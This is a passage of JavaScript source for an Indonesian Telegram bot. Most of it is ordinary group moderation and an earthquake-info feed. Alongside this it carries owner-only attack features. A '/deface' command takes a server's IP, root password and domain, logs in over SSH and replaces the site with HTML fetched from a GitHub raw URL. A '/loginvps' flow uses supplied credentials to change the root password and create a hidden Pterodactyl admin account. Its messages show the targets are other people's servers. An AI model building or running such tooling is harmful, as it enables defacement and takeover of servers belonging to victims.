    {

      text: "⌁ 𝗖𝗛𝗔𝗡𝗡𝗘𝗟",

      url: "https://t.me/MakloehF",

      style: "primary",

      icon_custom_emoji_id: EMOJI.keyboard
      }
    ]
  ];
}

// SCARRY V24: Satu kali send Rich, lalu hapus pesan menu sebelumnya.
// Ini menghindari tiga update bersamaan (media, caption, reply markup) dan error NOT_MODIFIED.
if (String(newCaption || '').trim() && Array.isArray(newButtons)) {
  try {
    const newMsg = await bot.__scarryRichInstalled.sendMenu(
      chatId, newCaption, { inline_keyboard: newButtons }, customMed.media,
      { parse_mode: newParseMode }
    );
    // Jika pesan baru sudah berhasil dikirim, baru hapus menu lama.
    if (newMsg && newMsg.message_id && newMsg.message_id !== messageId) {
      bot.deleteMessage(chatId, messageId).catch(err => {
        const desc = String(err?.message || err);
        if (!/message to delete not found|message can't be deleted/i.test(desc))
          console.warn('[SCARRY OLD MENU]',desc.slice(0,110));
      });
    }
  } catch (e) {
    const desc = String(e?.message || e);
    // Status tidak pasti: jangan kirim pesan kedua.
    console.warn('[SCARRY MENU NAVIGATION]',desc.slice(0,200));
  }
}

} catch (outer) {
  /* tetap silent sesuai request */
}
});

// /murbug (legacy) removed. Use the BUGS MENU navigation button.

const GROUP_FILE = path.join(__dirname, "SINGGLE ERA", "GroupGuard.json");
const WARN_FILE = path.join(__dirname, "SINGGLE ERA", "WarnData.json");

// Pastikan file tersedia
if (!fs.existsSync(GROUP_FILE)) fs.writeFileSync(GROUP_FILE, JSON.stringify({}, null, 2));
if (!fs.existsSync(WARN_FILE)) fs.writeFileSync(WARN_FILE, JSON.stringify({}, null, 2));

// Fungsi bantu
function loadJSON(file) {
  return JSON.parse(fs.readFileSync(file));
}
function saveJSON(file, data) {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

bot.onText(/\/setwelcome (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = msg.from.id;
  if (!(await isAdmin(chatId, sender))) return bot.sendMessage(chatId, "❌ Hanya admin yang bisa mengatur welcome.");

  const text = match[1];
  const data = loadJSON(GROUP_FILE);
  if (!data[chatId]) data[chatId] = { welcome: "", welcomeOn: true, antilink: false, antitag: false };
  data[chatId].welcome = text;
  saveJSON(GROUP_FILE, data);

  bot.sendMessage(chatId, `✅ Pesan welcome disimpan:\n\n${text}`);
});

bot.onText(/\/welcome (on|off)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = msg.from.id;
  if (!(await isAdmin(chatId, sender))) return;

  const data = loadJSON(GROUP_FILE);
  if (!data[chatId]) data[chatId] = {};
  data[chatId].welcomeOn = match[1] === "on";
  saveJSON(GROUP_FILE, data);

  bot.sendMessage(chatId, `🔔 Welcome message ${match[1].toUpperCase()}!`);
});

bot.onText(/\/antilink (on|off)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = msg.from.id;
  if (!(await isAdmin(chatId, sender))) return;

  const data = loadJSON(GROUP_FILE);
  if (!data[chatId]) data[chatId] = {};
  data[chatId].antilink = match[1] === "on";
  saveJSON(GROUP_FILE, data);

  bot.sendMessage(chatId, `⛔ Anti-Link ${match[1].toUpperCase()}!`);
});

bot.onText(/\/antitag (on|off)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const sender = msg.from.id;
  if (!(await isAdmin(chatId, sender))) return;

  const data = loadJSON(GROUP_FILE);
  if (!data[chatId]) data[chatId] = {};
  data[chatId].antitag = match[1] === "on";
  saveJSON(GROUP_FILE, data);

  bot.sendMessage(chatId, `🚫 Anti-Tag Username ${match[1].toUpperCase()}!`);
});

// =======================================================
// 👋 Pesan Welcome
// =======================================================
bot.on("new_chat_members", async (msg) => {
  const chatId = msg.chat.id;
  const data = loadJSON(GROUP_FILE)[chatId];
  if (!data || !data.welcomeOn || !data.welcome) return;

  msg.new_chat_members.forEach((member) => {
    const text = data.welcome
      .replace(/{nama}/gi, member.first_name)
      .replace(/{username}/gi, `@${member.username || "tidak_ada"}`);
    bot.sendMessage(chatId, text);
  });
});

// =======================================================
// 🚨 Anti-Link & Anti-Tag
// =======================================================
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const sender = msg.from.id;
  if (!msg.text) return;

  const data = loadJSON(GROUP_FILE)[chatId] || {};
  const isAdminUser = await isAdmin(chatId, sender);

  if (data.antilink && !isAdminUser && /(https?:\/\/|t\.me\/|discord\.gg|chat\.whatsapp\.com)/i.test(msg.text)) {
    try {
      await bot.deleteMessage(chatId, msg.message_id);
      await bot.sendMessage(chatId, `🚫 ${msg.from.first_name}, link tidak diperbolehkan di sini.`);
    } catch {}
  }

  if (data.antitag && !isAdminUser && msg.entities?.some(e => e.type === 'mention')) {
    try {
      await bot.deleteMessage(chatId, msg.message_id);
      await bot.sendMessage(chatId, `🚷 ${msg.from.first_name}, tag username tidak diperbolehkan!`);
    } catch {}
  }
});

// =======================================================
// 🔧 Admin Tools (Kick, Mute, Promote, Warn, Ban, GetPP)
// =======================================================
async function cleanCommand(chatId, msgId) {
  try { await bot.deleteMessage(chatId, msgId); } catch {}
}

// Kick
bot.onText(/\/kick/, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.reply_to_message) return;
  if (!(await isAdmin(chatId, msg.from.id))) return;
  cleanCommand(chatId, msg.message_id);
  bot.banChatMember(chatId, msg.reply_to_message.from.id)
    .then(() => bot.unbanChatMember(chatId, msg.reply_to_message.from.id))
    .then(() => bot.sendMessage(chatId, `👢 ${msg.reply_to_message.from.first_name} telah dikeluarkan.`));
});

// Mute / Unmute
bot.onText(/\/mute/, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.reply_to_message) return;
  if (!(await isAdmin(chatId, msg.from.id))) return;
  cleanCommand(chatId, msg.message_id);
  bot.restrictChatMember(chatId, msg.reply_to_message.from.id, { can_send_messages: false });
  bot.sendMessage(chatId, `🔇 ${msg.reply_to_message.from.first_name} telah di-mute.`);
});

bot.onText(/\/unmute/, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.reply_to_message) return;
  if (!(await isAdmin(chatId, msg.from.id))) return;
  cleanCommand(chatId, msg.message_id);
  bot.restrictChatMember(chatId, msg.reply_to_message.from.id, { can_send_messages: true });
  bot.sendMessage(chatId, `🔊 ${msg.reply_to_message.from.first_name} telah di-unmute.`);
});

// Promote & DelPromote
bot.onText(/\/promote (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!msg.reply_to_message) return;
  if (!(await isAdmin(chatId, msg.from.id))) return;
  cleanCommand(chatId, msg.message_id);

  const title = match[1];
  bot.promoteChatMember(chatId, msg.reply_to_message.from.id, {
    can_manage_chat: true,
    can_delete_messages: true,
    can_manage_video_chats: true,
    can_promote_members: false,
  }).then(() => bot.setChatAdministratorCustomTitle(chatId, msg.reply_to_message.from.id, title));
  bot.sendMessage(chatId, `🔰 ${msg.reply_to_message.from.first_name} dijadikan admin dengan jabatan: ${title}`);
});

bot.onText(/\/demote/, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.reply_to_message) return;
  if (!(await isAdmin(chatId, msg.from.id))) return;
  cleanCommand(chatId, msg.message_id);

  bot.promoteChatMember(chatId, msg.reply_to_message.from.id, {
    can_manage_chat: false,
    can_delete_messages: false,
    can_manage_video_chats: false,
    can_promote_members: false,
  });
  bot.sendMessage(chatId, `⚙️ ${msg.reply_to_message.from.first_name} bukan admin lagi.`);
});

// Warn (Auto mute 3x)
bot.onText(/\/warn/, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.reply_to_message) return;
  if (!(await isAdmin(chatId, msg.from.id))) return;
  cleanCommand(chatId, msg.message_id);

  const data = loadJSON(WARN_FILE);
  const uid = msg.reply_to_message.from.id;
  if (!data[chatId]) data[chatId] = {};
  data[chatId][uid] = (data[chatId][uid] || 0) + 1;

  if (data[chatId][uid] >= 3) {
    bot.restrictChatMember(chatId, uid, { can_send_messages: false });
    bot.sendMessage(chatId, `⚠️ ${msg.reply_to_message.from.first_name} telah mendapat 3 peringatan dan di-mute.`);
    data[chatId][uid] = 0;
  } else {
    bot.sendMessage(chatId, `⚠️ ${msg.reply_to_message.from.first_name} mendapat peringatan ke-${data[chatId][uid]}/3.`);
  }
  saveJSON(WARN_FILE, data);
});

// Ban & Unban
bot.onText(/\/ban/, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.reply_to_message) return;
  if (!(await isAdmin(chatId, msg.from.id))) return;
  cleanCommand(chatId, msg.message_id);

  bot.banChatMember(chatId, msg.reply_to_message.from.id);
  bot.sendMessage(chatId, `🚫 ${msg.reply_to_message.from.first_name} telah di-ban.`);
});

bot.onText(/\/unban/, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.reply_to_message) return;
  if (!(await isAdmin(chatId, msg.from.id))) return;
  cleanCommand(chatId, msg.message_id);

  bot.unbanChatMember(chatId, msg.reply_to_message.from.id);
  bot.sendMessage(chatId, `✅ ${msg.reply_to_message.from.first_name} sudah di-unban.`);
});

// Get Profile Picture
bot.onText(/\/getpp/, async (msg) => {
  const chatId = msg.chat.id;
  if (!msg.reply_to_message) return bot.sendMessage(chatId, "Balas pesan user untuk ambil fotonya.");
  cleanCommand(chatId, msg.message_id);

  const uid = msg.reply_to_message.from.id;
  try {
    const photos = await bot.getUserProfilePhotos(uid, { limit: 1 });
    if (photos.total_count === 0) return bot.sendMessage(chatId, "🚫 User tidak punya foto profil.");
    const fileId = photos.photos[0][0].file_id;
    bot.sendPhoto(chatId, fileId, { caption: `🖼️ Foto profil ${msg.reply_to_message.from.first_name}` });
  } catch {
    bot.sendMessage(chatId, "❌ Gagal mengambil foto profil.");
  }
});

// =======================================================
// 🔗 FITUR GET LINK & LINK PRIVATE - SCARRY DEATH SYSTEM
// =======================================================

bot.onText(/\/getlink/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Cek admin
  const admins = await bot.getChatAdministrators(chatId);
  const isAdmin = admins.some((a) => a.user.id === userId);
  if (!isAdmin) return bot.sendMessage(chatId, "❌ Hanya admin yang bisa menggunakan perintah ini.");

  try {
    const inviteLink = await bot.exportChatInviteLink(chatId);
    await bot.sendMessage(chatId, `🔗 *Link Grup:* ${inviteLink}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    bot.sendMessage(chatId, "⚠️ Gagal mengambil link grup. Pastikan bot punya izin *Invite Users via Link*.");
  }
});

// Fungsi ambil data BMKG
async function getGempaData() {
  const res = await axios.get('https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json');
  return res.data.Infogempa.gempa;
}

// Format pesan (HTML STYLE)
function formatGempaMessage(gempa) {
  return `
<blockquote>
🌏 <b>INFO GEMPA BMKG TERKINI</b>
━━━━━━━━━━━━━━━━━━
📅 <b>Tanggal:</b> ${gempa.Tanggal}
⏰ <b>Jam:</b> ${gempa.Jam}
📍 <b>Wilayah:</b> ${gempa.Wilayah}

📈 <b>Magnitudo:</b> ${gempa.Magnitude}
📌 <b>Kedalaman:</b> ${gempa.Kedalaman}

📍 <b>Koordinat:</b>
${gempa.Lintang}, ${gempa.Bujur}

🌊 <b>Potensi:</b> ${gempa.Potensi}
━━━━━━━━━━━━━━━━━━
</blockquote>
`;
}

// Command manual /gempa
bot.onText(/\/gempa/, async (msg) => {
  const chatId = msg.chat.id;

  try {
    const gempa = await getGempaData();
    const caption = formatGempaMessage(gempa);

    if (gempa.Shakemap) {
      await bot.sendPhoto(
        chatId,
        `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`,
        {
          caption,
          parse_mode: 'HTML',
        }
      );
    } else {
      await bot.sendMessage(chatId, caption, { parse_mode: 'HTML' });
    }
  } catch (error) {
    console.error(error);
    bot.sendMessage(chatId, '⚠️ Gagal mengambil data dari BMKG.');
  }
});

const { spawn } = require("child_process");

// escape HTML
function escHtml(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

const SSH_USER = "root";

const RAW_URL =
  "https://raw.githubusercontent.com/Raraaimupp/controlscarrydeath/refs/heads/main/web_source.html";

function normalizeDomain(d) {
  return String(d).replace(/^https?:\/\//, "").split("/")[0].trim();
}

function sshExec({ host, password, command, port = 22 }) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    conn
      .on("ready", () => {
        conn.exec(command, { pty: true }, (err, stream) => {
          if (err) return reject(err);
          let out = "", errOut = "";
          stream
            .on("close", (code) => {
              conn.end();
              if (code !== 0) return reject(new Error(errOut));
              resolve(out.trim());
            })
            .on("data", (d) => (out += d.toString()))
            .stderr.on("data", (d) => (errOut += d.toString()));
        });
      })
      .on("error", reject)
      .connect({
        host,
        port,
        username: SSH_USER,
        password,
      });
  });
}

/* ================= DEPLOY SCRIPT ================= */

function deployScript(domain) {
  return `
set -e
DOMAIN="${domain}"
ROOT="/var/www/thema/$DOMAIN"
CONF="/etc/nginx/sites-available/thema-$DOMAIN.conf"
LINK="/etc/nginx/sites-enabled/thema-$DOMAIN.conf"

mkdir -p "$ROOT"
curl -fsSL "${RAW_URL}" -o "$ROOT/index.html"
chmod 644 "$ROOT/index.html"

# disable old config for this domain
grep -Rsl "server_name[[:space:]]\\+$DOMAIN" /etc/nginx/sites-enabled 2>/dev/null | while read f; do
  rm -f "$f"
done || true

cat > "$CONF" <<EOF
server {
    listen 80;
    server_name $DOMAIN;
    root $ROOT;
    index index.html;
    location / {
        try_files \\$uri \\$uri/ /index.html;
    }
}
EOF

if [ -f "/etc/letsencrypt/live/$DOMAIN/fullchain.pem" ]; then
cat >> "$CONF" <<EOF

server {
    listen 443 ssl http2;
    server_name $DOMAIN;
    ssl_certificate /etc/letsencrypt/live/$DOMAIN/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/$DOMAIN/privkey.pem;
    include /etc/letsencrypt/options-ssl-nginx.conf;
    root $ROOT;
    index index.html;
    location / {
        try_files \\$uri \\$uri/ /index.html;
    }
}
EOF
fi

ln -sf "$CONF" "$LINK"
nginx -t
systemctl reload nginx
`;
}

/* ================= RESET SCRIPT ================= */

function resetScript(domain) {
  return `
set -e
DOMAIN="${domain}"
ROOT="/var/www/thema/$DOMAIN"
CONF="/etc/nginx/sites-available/thema-$DOMAIN.conf"
LINK="/etc/nginx/sites-enabled/thema-$DOMAIN.conf"

rm -f "$LINK"
rm -f "$CONF"
rm -rf "$ROOT"

nginx -t
systemctl reload nginx
`;
}

/* ================= COMMANDS ================= */

bot.onText(/^\/deface$/i, async (msg) => {
  if (!isOwner(msg.from.id))
    return bot.sendMessage(msg.chat.id, "❌ kamu bukan owner");

  sessions.set(msg.chat.id, { step: "ip" });
  bot.sendMessage(msg.chat.id, "kirim ip vps:");
});

bot.onText(/^\/reset (.+)$/i, async (msg, match) => {
  if (!isOwner(msg.from.id))
    return bot.sendMessage(msg.chat.id, "❌ kamu bukan owner");

  try {
    const parts = match[1].split("|");
    const ip = parts[0];
    const pw = parts[1];
    const domain = normalizeDomain(parts[2]);

    await sshExec({
      host: ip,
      password: pw,
      command: resetScript(domain),
    });

    bot.sendMessage(msg.chat.id, "success deface sudah di hapus");
  } catch (e) {
    bot.sendMessage(msg.chat.id, "❌ gagal reset");
  }
});

bot.on("message", async (msg) => {
  const sess = sessions.get(msg.chat.id);
  if (!sess) return;
  if (!isOwner(msg.from.id)) return;
  if (msg.text.startsWith("/")) return;

  try {
    if (sess.step === "ip") {
      sess.ip = msg.text.trim();
      sess.step = "pw";
      return bot.sendMessage(msg.chat.id, "kirim password vps:");
    }

    if (sess.step === "pw") {
      sess.pw = msg.text.trim();
      sess.step = "domain";
      return bot.sendMessage(msg.chat.id, "kirim domain panel (https://domain):");
    }

    if (sess.step === "domain") {
      const domain = normalizeDomain(msg.text);
      sessions.delete(msg.chat.id);

      await sshExec({
        host: sess.ip,
        password: sess.pw,
        command: deployScript(domain),
      });

      bot.sendMessage(msg.chat.id, "success domain target sudah di deface");
    }
  } catch (e) {
    sessions.delete(msg.chat.id);
    bot.sendMessage(msg.chat.id, "❌ ip vps / pw vps salah / sudah di ubah pemilik");
  }
});

// ===================== LOGIN VPS FEATURE =====================
const LOGIN_SSH_USER = "root"; // ubah kalau bukan root
const LOGIN_SSH_PORT = 22;     // kalau mau support port, nanti kita tambah

// helper: ssh exec khusus loginvps (pakai user berbeda jika perlu)
function sshExecLogin({ host, password, command, port = LOGIN_SSH_PORT }) {
  const { Client } = require("ssh2");
  return new Promise((resolve, reject) => {
    const conn = new Client();
    conn
      .on("ready", () => {
        conn.exec(command, { pty: true }, (err, stream) => {
          if (err) {
            conn.end();
            return reject(err);
          }
          let out = "", errOut = "";
          stream
            .on("close", (code) => {
              conn.end();
              if (code !== 0) return reject(new Error(errOut || `Exit code ${code}`));
              resolve(out.trim());
            })
            .on("data", (d) => (out += d.toString()))
            .stderr.on("data", (d) => (errOut += d.toString()));
        });
      })
      .on("error", reject)
      .connect({
        host,
        port,
        username: LOGIN_SSH_USER,
        password,
        readyTimeout: 20000,
      });
  });
}
// ================= LOGIN VPS (GABUNG FINAL) =================

// /loginvps (tanpa arg) => contoh
bot.onText(/^\/loginvps$/i, async (msg) => {
  if (!isOwner(msg.from.id))
    return bot.sendMessage(msg.chat.id, "❌ kamu bukan owner");

  bot.sendMessage(
    msg.chat.id,
`Format:
/loginvps ipvps|pwvps

Contoh:
/loginvps 170.64.198.171|passwordvps

Menu:
• ubah password vps
• create admin panel
• cek ram & cpu`
  );
});

// /loginvps ip|pw => login
bot.onText(/^\/loginvps (.+)$/i, async (msg, match) => {
  if (!isOwner(msg.from.id))
    return bot.sendMessage(msg.chat.id, "❌ kamu bukan owner");

  try {
    const parts = match[1].split("|").map(x => (x || "").trim());
    const ip = parts[0];
    const pw = parts[1];

    if (!ip || !pw) {
      return bot.sendMessage(
        msg.chat.id,
`❌ format salah

contoh:
/loginvps 170.64.198.171|passwordvps`
      );
    }

    // cek login ssh
    await sshExec({
      host: ip,
      password: pw,
      command: "whoami",
    });

    // detect domain aktif dari nginx (ambil domain pertama yang valid)
    const detectDomainCmd = `
nginx -T 2>/dev/null | awk 'tolower($1)=="server_name"{for(i=2;i<=NF;i++){gsub(/;$/,"",$i); print $i}}' \
| grep -vE '^(localhost|_|default_server)$' \
| grep -vE '^[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+$' \
| grep -vE '^\\*$' \
| sort -u | head -n 1
`.trim();

    let domain = "";
    try {
      domain = await sshExec({
        host: ip,
        password: pw,
        command: detectDomainCmd,
      });
    } catch (e) {}
    if (!domain) domain = "your-domain.com";

    // simpan session
    sessions.set(msg.chat.id, {
      mode: "loginvps",
      ip,
      pw,
      domain,
      step: "menu",
    });

    // menu button (3 tombol) -> tidak hilang saat diklik
    bot.sendMessage(msg.chat.id, "✅ login vps berhasil", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔐 ubah password vps", callback_data: "changepass" }],
          [{ text: "👑 create admin panel", callback_data: "createadminpanel" }],
          [{ text: "🔥 cek ram & cpu", callback_data: "cekramcpu" }],
        ],
      },
    });

  } catch (e) {
    bot.sendMessage(
      msg.chat.id,
`❌ login vps gagal

kemungkinan:
• ip salah
• password salah
• pw vps sudah di ganti
• kamu zonk coba panel lain`
    );
  }
});

// ================= BUTTON HANDLER =================
bot.on("callback_query", async (q) => {
  // V25: VPS handler must NOT intercept Scarry Death menu callbacks.
  // Other callbacks are owned by their respective registered handlers.
  if (!q?.message?.chat || !['changepass', 'createadminpanel', 'cekramcpu'].includes(q.data)) return;
  const chatId = q.message.chat.id;

  if (!isOwner(q.from.id)) {
    await bot.answerCallbackQuery(q.id, { text: "❌ kamu bukan owner", show_alert: true }).catch(() => {});
    return;
  }

  const sess = sessions.get(chatId);
  if (!sess || sess.mode !== "loginvps") {
    await bot.answerCallbackQuery(q.id).catch(() => {});
    return;
  }

  // ubah password vps
  if (q.data === "changepass") {
    sess.step = "newpw";
    sessions.set(chatId, sess);
    await bot.answerCallbackQuery(q.id);
    return bot.sendMessage(chatId, "masukkan password baru vps:");
  }

  // create admin panel
  if (q.data === "createadminpanel") {
    sess.step = "admin_username";
    sessions.set(chatId, sess);
    await bot.answerCallbackQuery(q.id);
    return bot.sendMessage(chatId, "masukkan username admin panel:");
  }

  // cek ram & cpu
  if (q.data === "cekramcpu") {
    await bot.answerCallbackQuery(q.id, { text: "⏳ cek vps...", show_alert: false });

    try {
      const cmd = `
set -e
HOST=$(hostname)
UP=$(uptime -p 2>/dev/null || true)

CPU_CORES=$(nproc 2>/dev/null || echo "-")
CPU_MODEL=$(lscpu 2>/dev/null | awk -F: '/Model name/ {gsub(/^ +/,"",$2); print $2; exit}' || true)

RAM_TOTAL=$(awk '/MemTotal/ {printf "%.2f GB", $2/1024/1024}' /proc/meminfo)
RAM_AVAIL=$(awk '/MemAvailable/ {printf "%.2f GB", $2/1024/1024}' /proc/meminfo)
RAM_USED=$(free -b | awk 'NR==2{printf "%.2f GB", $3/1024/1024/1024}')

DISK=$(df -h / | awk 'NR==2{print $2" total / "$3" used / "$4" free ("$5")"}')

PUBIP=$(curl -fsSL ifconfig.me 2>/dev/null || curl -fsSL ipinfo.io/ip 2>/dev/null || echo "-")

echo "HOST=$HOST"
echo "UPTIME=$UP"
echo "PUBLIC_IP=$PUBIP"
echo "CPU_CORES=$CPU_CORES"
echo "CPU_MODEL=$CPU_MODEL"
echo "RAM_TOTAL=$RAM_TOTAL"
echo "RAM_USED=$RAM_USED"
echo "RAM_AVAIL=$RAM_AVAIL"
echo "DISK_ROOT=$DISK"
`.trim();

      const out = await sshExec({
        host: sess.ip,
        password: sess.pw,
        command: cmd,
      });

      const data = {};
      out.split("\n").forEach((line) => {
        const idx = line.indexOf("=");
        if (idx > 0) data[line.slice(0, idx)] = line.slice(idx + 1);
      });

      const info =
`🖥️ VPS DETAIL INFO

Host     : ${data.HOST || "-"}
Uptime   : ${data.UPTIME || "-"}
Public IP: ${data.PUBLIC_IP || "-"}

CPU Cores: ${data.CPU_CORES || "-"}
CPU Model: ${data.CPU_MODEL || "-"}

RAM Total: ${data.RAM_TOTAL || "-"}
RAM Used : ${data.RAM_USED || "-"}
RAM Avail: ${data.RAM_AVAIL || "-"}

Disk /   : ${data.DISK_ROOT || "-"}`;

      // kirim pesan baru -> button tetap ada
      await bot.sendMessage(chatId, info);
    } catch (e) {
      await bot.sendMessage(chatId, "❌ gagal cek ram & cpu vps");
    }
    return;
  }
});

// ================= MESSAGE FLOW (INPUT) =================
bot.on("message", async (msg) => {
  const chatId = msg.chat.id;
  const sess = sessions.get(chatId);

  if (!sess) return;
  if (sess.mode !== "loginvps") return;
  if (!isOwner(msg.from.id)) return;
  if (msg.text?.startsWith("/")) return;

  try {
    // ubah password VPS
    if (sess.step === "newpw") {
      const newPw = msg.text.trim();
      if (newPw.length < 6) {
        return bot.sendMessage(chatId, "❌ password terlalu pendek. minimal 6 karakter. kirim lagi:");
      }

      await sshExec({
        host: sess.ip,
        password: sess.pw,
        command: `echo "root:${newPw.replace(/"/g, '\\"')}" | chpasswd`,
      });

      sessions.delete(chatId);
      return bot.sendMessage(chatId, "✅ success password vps berhasil diubah");
    }

    // create admin panel: username
    if (sess.step === "admin_username") {
      const u = msg.text.trim();
      if (!u) return;
      sess.adminUser = u;
      sess.step = "admin_password";
      sessions.set(chatId, sess);
      return bot.sendMessage(chatId, "masukkan password admin panel:");
    }

    // create admin panel: password
    if (sess.step === "admin_password") {
      const p = msg.text.trim();
      if (p.length < 8) {
        return bot.sendMessage(chatId, "❌ password minimal 8 karakter. kirim lagi password admin panel:");
      }

      const domain = sess.domain || "your-domain.com";
      const username = sess.adminUser;
      const password = p;

      const email = `${username}@${domain}`;
      const first = username;
      const last = "admin";

      const cmd = `
set -e
cd /var/www/pterodactyl
php artisan p:user:make --email="${email}" --username="${username}" --name-first="${first}" --name-last="${last}" --password="${password}" --admin=1 --no-interaction
echo "OK"
`.trim();

      await sshExec({
        host: sess.ip,
        password: sess.pw,
        command: cmd,
      });

      sessions.delete(chatId);

      return bot.sendMessage(
        chatId,
`Succes create admin panel
Username : ${username}
Password : ${password}
Login : https://${domain}`
      );
    }

  } catch (e) {
    sessions.delete(chatId);
    return bot.sendMessage(chatId, "❌ gagal proses (cek panel path / php artisan / permission)");
  }
});
// =================== END LOGIN VPS FEATURE ===================
// ==============================
const GROUP_ALLOW_FILE = path.join(__dirname, "SINGGLE ERA", "AllowedGroups.json");

function loadAllowedGroups() {
  try {
    if (!fs.existsSync(GROUP_ALLOW_FILE)) return [];

    const raw = JSON.parse(fs.readFileSync(GROUP_ALLOW_FILE, "utf8"));

    let groups = [];

    // Format baru: { groups: [...] }
    if (Array.isArray(raw?.groups)) {
      groups = raw.groups;
    }
    // Format lama: langsung array
    else if (Array.isArray(raw)) {
      groups = raw;
    }

    // Normalisasi format
    return groups.map(g => {
      if (typeof g === "string") {
        return { id: String(g), expired: 0 }; // lama tanpa expired
      }
      if (typeof g === "object" && g?.id) {
        return {
          id: String(g.id),
          expired: Number(g.expired) || 0
        };
      }
      return null;
    }).filter(Boolean);

  } catch {
    return [];
  }
}

function saveAllowedGroups(groups) {
  try {
    fs.mkdirSync(path.dirname(GROUP_ALLOW_FILE), { recursive: true });

    fs.writeFileSync(
      GROUP_ALLOW_FILE,
      JSON.stringify(
        {
          groups,
          updatedAt: Date.now()
        },
        null,
        2
      )
    );
  } catch {}
}

let allowedGroups = loadAllowedGroups();

function refreshAllowedGroups() {
  allowedGroups = loadAllowedGroups();
  return allowedGroups;
}

function isGroupChat(msg) {
  const t = msg?.chat?.type;
  return t === "group" || t === "supergroup";
}

function isGroupAllowed(chatId) {
  const now = Date.now();

  const found = allowedGroups.find(g => String(g.id) === String(chatId));
  if (!found) return false;

  // Kalau expired = 0 → permanent
  if (!found.expired || found.expired === 0) return true;

  // Kalau masih aktif
  if (found.expired > now) return true;

  // Kalau sudah expired → auto remove
  allowedGroups = allowedGroups.filter(g => String(g.id) !== String(chatId));
  saveAllowedGroups(allowedGroups);

  return false;
}

// /addgroup (jalankan di group)
bot.onText(/^\/addgroup(?:\s+(\d+)d)?$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI");
  }

  if (!isGroupChat(msg)) {
    return bot.sendMessage(chatId, "Perintah ini hanya bisa dipakai di GROUP.");
  }

  const gid = String(chatId);

  // ===== HELP / FORMAT =====
  if (!match || !match[1]) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 ADD GROUP PREMIUM 」───
│
│ Format:
│ /addgroup 5d
│
│ Keterangan:
│ d = hari
│
│ Contoh:
│ /addgroup 7d  (aktif 7 hari)
│ /addgroup 30d (aktif 30 hari)
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  const days = parseInt(match[1], 10);

  if (isNaN(days) || days <= 0) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 ADD GROUP PREMIUM 」───
│ ❌ Durasi tidak valid!
│ Gunakan contoh: /addgroup 5d
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });
  }

  const now = Date.now();
  const addMs = days * 24 * 60 * 60 * 1000;

  // ===== SUPPORT FORMAT LAMA (ARRAY STRING) =====
  // Kalau allowedGroups masih ["-100xxx", ...] ubah jadi objek
  if (Array.isArray(allowedGroups) && allowedGroups.length > 0 && typeof allowedGroups[0] === "string") {
    allowedGroups = allowedGroups.map(id => ({ id: String(id), expired: now }));
  }

  // ===== CARI DATA GROUP =====
  const idx = allowedGroups.findIndex(g => String(g.id) === gid);

  let oldExpired = 0;
  let newExpired = 0;

  if (idx !== -1) {
    oldExpired = Number(allowedGroups[idx].expired) || 0;

    // Kalau masih aktif, extend dari expired lama
    // Kalau sudah habis, mulai dari sekarang
    const base = oldExpired > now ? oldExpired : now;
    newExpired = base + addMs;

    allowedGroups[idx].expired = newExpired;
  } else {
    newExpired = now + addMs;
    allowedGroups.push({ id: gid, expired: newExpired });
  }

  saveAllowedGroups(allowedGroups);

  const expireDate = new Date(newExpired).toLocaleString("id-ID");
  const remainingMs = newExpired - now;
  const remainingDays = Math.ceil(remainingMs / (24 * 60 * 60 * 1000));

  const statusLine = (oldExpired && oldExpired > now)
    ? `✅ EXTEND +${days} Hari`
    : `✅ AKTIF ${days} Hari`;

  return bot.sendMessage(chatId, `
<blockquote>
╭───「 GROUP PREMIUM MANAGER 」───
│
│ 〆 Group ID   : <code>${gid}</code>
│ 〆 Action     : ${statusLine}
│ 〆 Sisa       : ${remainingDays} Hari
│ 〆 Expired    : ${expireDate}
│
│ 〆 Akses      : Premium All Member
│
╰────────────────
</blockquote>
`, { parse_mode: "HTML" });

});

// /delgroup (jalankan di group)
bot.onText(/^\/delgroup$/i, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from?.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId, "HANYA OWNER YANG BISA MENGGUNAKAN FITUR INI");
  }

  if (!isGroupChat(msg)) {
    return bot.sendMessage(chatId, "Perintah ini hanya bisa dipakai di GROUP.");
  }

  const gid = String(chatId);

  // ===== SUPPORT FORMAT LAMA & BARU =====
  let found = false;

  if (Array.isArray(allowedGroups) && allowedGroups.length > 0) {

    if (typeof allowedGroups[0] === "string") {
      // FORMAT LAMA
      if (allowedGroups.includes(gid)) {
        found = true;
        allowedGroups = allowedGroups.filter(x => x !== gid);
      }

    } else {
      // FORMAT BARU { id, expired }
      const beforeLength = allowedGroups.length;
      allowedGroups = allowedGroups.filter(g => String(g.id) !== gid);
      found = allowedGroups.length !== beforeLength;
    }
  }

  if (!found) {
    return bot.sendMessage(chatId, `
<blockquote>
╭───「 GROUP PREMIUM MANAGER 」───
